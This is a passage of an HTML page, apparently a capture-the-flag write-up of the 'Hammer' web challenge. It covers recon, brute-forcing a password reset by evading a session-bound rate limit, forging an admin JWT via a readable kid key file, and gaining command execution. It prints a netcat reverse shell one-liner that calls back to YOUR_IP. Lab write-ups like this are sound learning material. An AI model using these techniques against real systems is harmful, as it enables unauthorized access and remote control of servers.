@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Hammer</title>
+
+  <link rel="shortcut icon" href="../img/favicon.ico" type="image/x-icon" />
+  <link rel="stylesheet" href="../css/main.css" />
+  <link rel="stylesheet" href="../css/media.css" />
+  <link rel="stylesheet" href="../css/writeups.css" />
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css" crossorigin="anonymous" />
+
+  <script defer src="../js/writeups.js"></script>
+</head>
+
+<body class="left-aligned-hero">
+  <div id="nav-placeholder"></div>
+  <div id="content" class="fade-in">
+
+    <section id="home" class="hero">
+      <div class="container container-lg">
+        <a href="../writeups.html" class="back-arrow" data-aos="fade-right" data-aos-duration="1000">← Back to Writeups</a>
+        
+        <div class="hero-content">
+          <div class="hero-image" data-aos="fade-up" data-aos-duration="1000">
+            <img src="../img/writeups/hammer.png" alt="Hammer" />
+          </div>
+          <h1 class="hero-heading" data-aos="fade-up" data-aos-duration="1200">Hammer</h1>
+          <p class="writeup-meta" data-aos="fade-up" data-aos-duration="1400">
+            <strong>Category:</strong> Web Exploitation | 
+            <strong>Difficulty:</strong> Medium | 
+            <strong>Date:</strong> May 8, 2025
+          </p>
+          <p class="writeup-summary" data-aos="fade-up" data-aos-duration="1600">
+            Bypass authentication mechanisms, manipulate JWTs, and exploit a PHP web app for RCE.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <section id="writeup-content" class="writeup-content">
+      <div class="container">
+
+        <h2 class="section-title" data-aos="fade-right" data-aos-duration="1000">Recon</h2>
+        <p data-aos="fade-right" data-aos-duration="1200">
+          I kicked things off with an Nmap scan to scope out exposed services. It revealed SSH on port 22 and a web server running on port 1337.
+        </p>
+
+        <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+          <code>nmap -p- -A -T4 hammer.thm</code>
+        </pre>
+
+        <p data-aos="fade-right" data-aos-duration="1200">
+          I quickly discovered an Apache server hosting a PHP site. Using Feroxbuster and some manual probing, I found a few interesting directories, including a suspicious <code>hmr_logs/</code> folder. That turned out to be gold — it contained error logs.
+        </p>
+
+        <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+          <code>feroxbuster -u http://hammer.thm:1337 -w /usr/share/wordlists/dirb/big.txt</code>
+        </pre>
+
+        <h2 class="section-title" data-aos="fade-right" data-aos-duration="1000">Enumeration</h2>
+        <p data-aos="fade-right" data-aos-duration="1200">
+          The error logs leaked an internal user: <code>tester@hammer.thm</code>. From there, I looked into the password reset feature. A four-digit code was required, and brute-forcing it looked painful — at first. But turns out the rate-limiting was tied to the session, not the IP or email.
+        </p>
+
+        <p data-aos="fade-right" data-aos-duration="1200">
+          I scripted a workaround: every 7 attempts, refresh the session and keep firing codes. Eventually, I landed the right token, reset the password, and logged in.
+        </p>
+
+        <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+          <code>curl -X POST http://hammer.thm:1337/reset_password.php \<br>
+            -d "email=tester%40hammer.thm" \<br>
+            -H "Content-Type: application/x-www-form-urlencoded" -v</code>
+        </pre>
+
+        <h2 class="section-title" data-aos="fade-right" data-aos-duration="1000">Gaining Access</h2>
+        <p data-aos="fade-right" data-aos-duration="1200">
+          Logging in dropped me into a dashboard with a command execution panel. The site was using a JWT for authentication and role management. I noticed the <code>kid</code> header pointed to a local key file — and guess what? I had access to it.
+        </p>
+
+        <p data-aos="fade-right" data-aos-duration="1200">
+          Using the leaked key, I forged a JWT using JWT.io with an <code>admin</code> role. This gave me unrestricted command execution.
+        </p>
+
+        <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+          <code>{
+            "typ": "JWT",<br>
+            "alg": "HS256",<br>
+            "kid": "/var/www/html/188ade1.key"<br>
+          }<br>
+          {<br>
+            "iss": "http://hammer.thm",<br>
+            "aud": "http://hammer.thm",<br>
+            "iat": 1725193591,<br>
+            "exp": 1725199591,<br>
+            "data": {<br>
+              "user_id": 1,<br>
+              "email": "tester@hammer.thm",<br>
+              "role": "admin"<br>
+            }
+          }</code>
+        </pre>
+
+        <h2 class="section-title" data-aos="fade-right" data-aos-duration="1000">Exploitation & RCE</h2>
+        <p data-aos="fade-right" data-aos-duration="1200">
+          With admin privileges, I executed arbitrary shell commands. I retrieved flags and confirmed I had access as <code>www-data</code>. Eventually, I dropped a reverse shell using BusyBox and escalated from there.
+        </p>
+
+        <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+          <code>rm /tmp/f<br>
+            mkfifo /tmp/f<br>
+            cat /tmp/f | /bin/sh -i 2>&1 | nc YOUR_IP 4444 > /tmp/f</code>
+        </pre>
+
+        <ul data-aos="fade-right" data-aos-duration="1300">
+          <li>Flag 1: Found post-login with user role.</li>
+          <li>Flag 2: Retrieved after RCE as <code>www-data</code>.</li>
+        </ul>
+
+        <h2 class="section-title" data-aos="fade-right" data-aos-duration="1000">Conclusion</h2>
+        <p data-aos="fade-right" data-aos-duration="1200">
+          Hammer was a full-stack web exploitation challenge that blended recon, scripting, and token manipulation. My key takeaway: sessions and JWTs can make or break security — and when you get access to a key file, it's basically game over. Always check logs, always script where possible, and never assume rate-limits are solid.
+        </p>
+
+      </div>
+    </section>
+  </div>
+
+  <div id="footer-placeholder"></div>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
+  <script src="../js/components.js"></script>
+  <script type="module" src="../js/main.js"></script>
+
+  <script>
+    AOS.init({ duration: 1000, easing: 'ease-in-out', once: true });
+    document.addEventListener("DOMContentLoaded", () => {
+      document.getElementById("content").classList.add("fade-in-active");
+    });
+  </script>
+</body>
+</html>
